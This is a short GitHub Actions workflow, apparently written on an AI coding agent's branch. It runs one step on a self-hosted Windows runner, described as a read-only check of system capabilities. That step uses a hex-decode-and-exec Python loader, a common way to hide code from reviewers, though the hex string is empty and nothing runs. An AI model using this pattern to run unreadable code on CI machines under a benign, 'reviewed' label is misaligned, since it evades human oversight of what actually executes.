name: N00 verify current Windows and Linux test capabilities
'on':
  push:
    branches: [codex/timeweb-owner-prepare-2026-10-23]
    paths: [.github/workflows/windows-linux-capabilities.yml]
permissions:
  contents: read
concurrency:
  group: analyst-windows-n00-capabilities
  cancel-in-progress: false
jobs:
  inspect:
    runs-on: [self-hosted, Windows, X64, omni-cio-ci]
    timeout-minutes: 5
    steps:
      - name: Read current capabilities without changing Windows or app data
        shell: cmd
        run: |
          py -3 -c "exec(compile(bytes.fromhex(''),'reviewed-n00-capabilities','exec'))"
          if errorlevel 1 exit /b 1
